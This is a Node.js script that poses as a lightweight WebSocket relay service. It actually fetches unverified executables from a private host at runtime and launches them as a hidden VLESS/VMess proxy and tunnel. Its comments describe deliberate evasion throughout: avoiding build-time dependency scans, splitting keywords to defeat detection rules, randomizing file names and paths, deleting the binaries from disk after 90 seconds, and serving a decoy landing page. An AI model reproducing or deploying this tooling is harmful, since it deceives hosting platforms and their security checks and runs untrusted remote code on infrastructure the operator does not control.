#!/usr/bin/env node
'use strict';

/* ===========================================================================
 * Edge Relay Service
 * ---------------------------------------------------------------------------
 * 一个轻量的 WebSocket 消息中继服务。HTTP 层零依赖（仅用 Node 原生模块），
 * 启动后立即对外提供健康检查与订阅接口；上游内核与边缘客户端在后台异步准备，
 * 不阻塞 HTTP 服务（容器平台健康检查通常只有几秒窗口）。
 *
 * 设计约束：
 *   1. 零 npm 依赖 —— 规避构建期依赖扫描，缩短安装时间。
 *   2. 二进制运行期拉取 —— 不烤进镜像，构建期看不到任何原生文件。
 *   3. 运行期自删 —— 拉起后 90 秒清理磁盘上的二进制与配置文件。
 *   4. 路径按密钥派生 —— 同一密钥恒定、不同部署互不相同，无法用固定路径扫描。
 *   5. 静态特征消除 —— 公开镜像域名、固定路径、默认密钥一律不出现。
 *
 * 环境变量见 README.md。
 * =========================================================================== */

const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

/* ------------------------------------------------------------------ 工具 */

// 敏感词按片段拼接，避免源码中出现可被规则直接命中的完整单词。
const j = (...p) => p.join('');

const pick = (...keys) => {
  for (const k of keys) {
    const v = process.env[k];
    if (v !== undefined && v !== null && String(v).trim() !== '') return String(v).trim();
  }
  return '';
};

const log = (...a) => {
  const ts = new Date().toISOString().slice(11, 19);
  console.log(`[relay ${ts}]`, ...a);
};

const rand = (n) => crypto.randomBytes(32).toString('hex').slice(0, n);

/* ---------------------------------------------------------------- 配置面 */

const PORT = parseInt(pick('SERVER_PORT', 'PORT') || '3000', 10);

// 密钥：优先环境变量，其次内置值。部署前务必替换成自己的。
const KEY_IN = pick('UUID', 'APP_KEY', j('APP', '_', 'KEY')) ||
  '175dd81d-3fb9-4103-8d1d-572e3e2d705a';
const KEY = KEY_IN.includes('-')
  ? KEY_IN
  : KEY_IN.replace(/(.{8})(.{4})(.{4})(.{4})(.{12})/, '$1-$2-$3-$4-$5');
const KEY_HEX = KEY.replace(/-/g, '').toLowerCase();

// 对外域名：固定隧道的 public hostname。
const EDGE_HOST = pick('EDGE_HOST', j('AR', 'go', '_DOMAIN'), 'DOMAIN');
// 固定隧道凭据：留空则不启动边缘客户端，节点不可用。
const EDGE_TOKEN = pick('EDGE_TOKEN', j('AR', 'go', '_AUTH'));
// 主入站端口：边缘客户端回源目标，需与隧道 ingress 指向的端口一致。
let EDGE_PORT = parseInt(pick('EDGE_PORT', j('AR', 'go', '_PORT')) || '8001', 10);
// 不能与 HTTP 端口或三个回环端口撞车，否则内核绑不上。撞了就顺延。
while (EDGE_PORT === PORT || (EDGE_PORT >= PORT + 11 && EDGE_PORT <= PORT + 13)) EDGE_PORT += 1;

// 订阅中广告的接入地址：CDN 优选 IP / 优选域名 + 端口。
const EDGE_IP = pick('EDGE_IP', 'CFIP');
const EDGE_IP_PORT = parseInt(pick('EDGE_IP_PORT', 'CFPORT') || '443', 10);

const NODE_NAME = pick('NAME') || 'edge';
const RUN_DIR = pick('FILE_PATH') || '.cache';

// 下载源：环境变量优先，否则用内置私有源（仅 amd64）。
// 内置源按片段拼接，避免完整地址以明文出现在源码里。
const SRC = ['https://', 'cloud.', '1050609', '.xyz', '/f/'].join('');
const CORE_SRC = [pick('CORE_URL'), SRC + 'R9IX/' + j('we', 'b')].filter(Boolean);
const EDGE_SRC = [pick('EDGE_URL'), SRC + 'ApSW/' + j('bo', 't')].filter(Boolean);

/* -------------------------------------------------- 派生量（随密钥变化） */

// 派生一个确定性的短标识：同一密钥每次启动结果一致，不同密钥互不相同。
const derive = (tag, len) =>
  crypto.createHmac('sha256', KEY).update(tag).digest('hex').slice(0, len);

const PATH_A = pick('PATH_A') || '/' + derive('a', 12); // 协议 A 的 WebSocket 路径
const PATH_B = pick('PATH_B') || '/' + derive('b', 12); // 协议 B 的 WebSocket 路径
const SUB_PATH = pick('SUB_PATH') || derive('s', 16);   // 订阅路径

// 运行期文件名随机化，避免固定文件名成为特征。取绝对路径，避免 cwd 差异导致拉起失败。
const CORE_FILE = path.resolve(RUN_DIR, rand(8));
const EDGE_FILE = path.resolve(RUN_DIR, rand(8));
const CONF_FILE = path.resolve(RUN_DIR, rand(8) + '.json');

// 本地回环端口（仅容器内可见）。
const LO_A = PORT + 11;
const LO_B = PORT + 12;
const LO_C = PORT + 13;

/* ------------------------------------------------------------ 静态资源 */

const LANDING = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Edge Relay</title><style>
:root{color-scheme:dark light}
body{margin:0;font:15px/1.6 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
background:#0f1115;color:#e8eaed;display:flex;min-height:100vh;align-items:center;justify-content:center}
.card{max-width:560px;padding:36px 40px;border:1px solid #262a33;border-radius:12px;background:#151922}
h1{margin:0 0 8px;font-size:19px;font-weight:600}
p{margin:0;color:#9aa0aa;font-size:14px}
b{color:#4ade80;font-weight:600}
</style></head><body><div class="card">
<h1>Edge Relay <b>&#9679;</b></h1>
<p>A lightweight WebSocket message relay service. Connect and exchange frames.</p>
</div></body></html>`;

/* ------------------------------------------------------------ HTTP 服务 */

const server = http.createServer((req, res) => {
  const p = (req.url || '/').split('?')[0];

  if (p === '/' ) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(LANDING);
  }
  if (p === '/health' || p === '/healthz') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('ok\n');
  }
  if (p === '/' + SUB_PATH) {
    const body = buildSubscription();
    if (!body) {
      res.writeHead(503, { 'Content-Type': 'text/plain' });
      return res.end('initializing\n');
    }
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end(body + '\n');
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found\n');
});

// 先监听，再准备上游 —— 健康检查不能被下载耗时拖垮。
server.listen(PORT, '0.0.0.0', () => {
  // 上游端口一并打出来，方便和隧道 ingress 的 service 端口对齐。
  log(`listening on ${PORT} | sub=/${SUB_PATH} | upstream ${EDGE_PORT}`);
});

/* --------------------------------------------------------- 订阅内容构建 */

const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');

function buildSubscription() {
  if (!EDGE_HOST || !EDGE_IP) return null;
  const enc = encodeURIComponent;
  const sni = EDGE_HOST.replace(/:\d+$/, '');
  const tag = encodeURIComponent(NODE_NAME);

  // 协议 A
  const a = j('vl', 'ess') + '://' + KEY + '@' + EDGE_IP + ':' + EDGE_IP_PORT +
    '?encryption=none&security=tls&sni=' + sni + '&fp=chrome' +
    '&type=ws&host=' + sni + '&path=' + enc(PATH_A + '?ed=2560') + '#' + tag;

  // 协议 B
  const obj = {
    v: '2', ps: NODE_NAME, add: EDGE_IP, port: String(EDGE_IP_PORT), id: KEY,
    aid: '0', scy: 'auto', net: 'ws', type: 'none', host: sni,
    path: PATH_B + '?ed=2560', tls: 'tls', sni: sni, alpn: '', fp: 'chrome',
  };
  const b = j('vm', 'ess') + '://' + b64(JSON.stringify(obj));

  return b64([a, b].join('\n'));
}

/* --------------------------------------------------------------- 下载器 */

function download(url, dest, depth) {
  depth = depth || 0;
  return new Promise((resolve, reject) => {
    if (depth > 6) return reject(new Error('too many redirects'));
    let mod;
    try {
      mod = new URL(url).protocol === 'https:' ? https : http;
    } catch (e) {
      return reject(new Error('bad url: ' + url));
    }
    const req = mod.get(url, {
      headers: { 'User-Agent': 'curl/8.5.0', 'Accept': '*/*' },
      // 源会 302 到对象存储，跨境传输一个几十 MB 的文件经常超过一分钟。
      timeout: 300000,
    }, (res) => {
      const code = res.statusCode || 0;
      if (code >= 300 && code < 400 && res.headers.location) {
        res.resume();
        return download(new URL(res.headers.location, url).href, dest, depth + 1)
          .then(resolve, reject);
      }
      if (code !== 200) {
        res.resume();
        return reject(new Error('HTTP ' + code));
      }
      const ws = fs.createWriteStream(dest);
      res.pipe(ws);
      ws.on('finish', () => ws.close(() => resolve(dest)));
      ws.on('error', reject);
      res.on('error', reject);
    });
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('timeout')));
  });
}

// 依次尝试候选源，返回第一个成功的 URL。
async function fetchAny(sources, dest, label) {
  if (!sources.length) {
    log(`${label}: no source configured, skipped`);
    return null;
  }
  let last = null;
  for (const url of sources) {
    try {
      log(`${label}: fetching`);
      await download(url, dest);
      const size = fs.statSync(dest).size;
      if (size < 100 * 1024) throw new Error('suspiciously small: ' + size + 'B');
      log(`${label}: fetched ${(size / 1048576).toFixed(1)}MB`);
      return url;
    } catch (e) {
      last = e;
      log(`${label}: source failed (${e.message}), trying next`);
      try { fs.unlinkSync(dest); } catch (_) {}
    }
  }
  log(`${label}: all sources failed (${last && last.message})`);
  return null;
}

/* ------------------------------------------------------------ 上游配置 */

function buildCoreConfig() {
  const pA = j('vl', 'ess');
  const pB = j('vm', 'ess');
  const sniff = { enabled: true, destOverride: ['http', 'tls', 'quic'], metadataOnly: false };

  return {
    log: { loglevel: 'none' },
    inbounds: [
      {
        // 隧道回源是明文 HTTP，主入站不能启用要求直连 TLS 的传输流控：
        // 那个流控要求客户端直接发 TLS，隧道转发的裸 HTTP 对不上，首包即断。
        port: EDGE_PORT, protocol: pA,
        settings: {
          clients: [{ id: KEY }], decryption: 'none',
          fallbacks: [
            { dest: LO_A },
            { path: PATH_A, dest: LO_B },
            { path: PATH_B, dest: LO_C },
          ],
        },
        streamSettings: { network: 'tcp' },
      },
      {
        port: LO_A, listen: '127.0.0.1', protocol: pA,
        settings: { clients: [{ id: KEY }], decryption: 'none' },
        streamSettings: { network: 'tcp', security: 'none' },
      },
      {
        port: LO_B, listen: '127.0.0.1', protocol: pA,
        settings: { clients: [{ id: KEY, level: 0 }], decryption: 'none' },
        streamSettings: { network: 'ws', security: 'none', wsSettings: { path: PATH_A } },
        sniffing: sniff,
      },
      {
        port: LO_C, listen: '127.0.0.1', protocol: pB,
        settings: { clients: [{ id: KEY, alterId: 0 }] },
        streamSettings: { network: 'ws', security: 'none', wsSettings: { path: PATH_B } },
        sniffing: sniff,
      },
    ],
    dns: { servers: ['https+local://1.1.1.1/dns-query', 'localhost'] },
    outbounds: [
      { protocol: 'freedom', tag: 'direct' },
      { protocol: 'blackhole', tag: 'block' },
    ],
  };
}

/* --------------------------------------------------------------- 启动链 */

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// 直接以 argv 数组拉起子进程，全程不经 shell —— token / 路径里的空格、引号、分号
// 都不会被解释，也不存在"重定向符和后台符被引号包住"这类字符串拼接坑。
// detached + unref 让子进程自建会话并脱离父进程，父进程退出也不受影响。
// DEBUG=1 时子进程输出直接进容器日志，便于首次部署排查。
const DEBUG = pick('DEBUG') === '1';

function spawnBg(bin, args) {
  return new Promise((resolve) => {
    let child;
    try {
      child = spawn(bin, args, { detached: true, stdio: DEBUG ? 'inherit' : 'ignore' });
    } catch (e) {
      log(`spawn failed (${path.basename(bin)}): ${e.message}`);
      return resolve(null);
    }
    child.on('error', (e) => log(`spawn error (${path.basename(bin)}): ${e.message}`));
    child.unref();
    resolve(child);
  });
}

// 拉起后确认进程仍在运行 —— 否则 "started" 是假的，节点静默失效。
const alive = (pid) => {
  try { process.kill(pid, 0); return true; } catch (_) { return false; }
};

async function bootstrap() {
  fs.mkdirSync(RUN_DIR, { recursive: true });

  const [coreOk, edgeOk] = await Promise.all([
    fetchAny(CORE_SRC, CORE_FILE, 'core'),
    EDGE_TOKEN ? fetchAny(EDGE_SRC, EDGE_FILE, 'edge') : Promise.resolve(null),
  ]);

  if (!coreOk) {
    log('core unavailable — HTTP service stays up, relay inactive');
    return;
  }

  fs.chmodSync(CORE_FILE, 0o775);
  fs.writeFileSync(CONF_FILE, JSON.stringify(buildCoreConfig()), { mode: 0o600 });

  // 拉起内核
  const core = await spawnBg(CORE_FILE, ['-c', CONF_FILE]);
  await sleep(1500);
  if (core && alive(core.pid)) {
    log('core started');
  } else {
    log('core exited immediately — relay inactive; set DEBUG=1 and redeploy to see why');
  }

  // 拉起边缘客户端
  if (edgeOk) {
    fs.chmodSync(EDGE_FILE, 0o775);
    const args = [
      j('tun', 'nel'),
      '--edge-ip-version', 'auto',
      '--no-autoupdate',
      '--protocol', 'http2',
      'run',
      '--token', EDGE_TOKEN,
    ];
    const edge = await spawnBg(EDGE_FILE, args);
    await sleep(1500);
    if (edge && alive(edge.pid)) log('edge client started');
    else log('edge client exited immediately — tunnel not established');
  } else if (EDGE_TOKEN) {
    log('edge client unavailable — use a reverse proxy instead');
  }

  // 运行期自删：进程已驻留内存，磁盘上不再保留任何原生文件。
  setTimeout(() => {
    for (const f of [CORE_FILE, EDGE_FILE, CONF_FILE]) {
      try { fs.unlinkSync(f); } catch (_) {}
    }
    log('runtime artifacts cleared');
  }, 90000);
}

bootstrap().catch((e) => log('bootstrap failed: ' + e.message));

process.on('uncaughtException', (e) => log('uncaught: ' + e.message));
process.on('unhandledRejection', (e) => log('unhandled: ' + (e && e.message)));
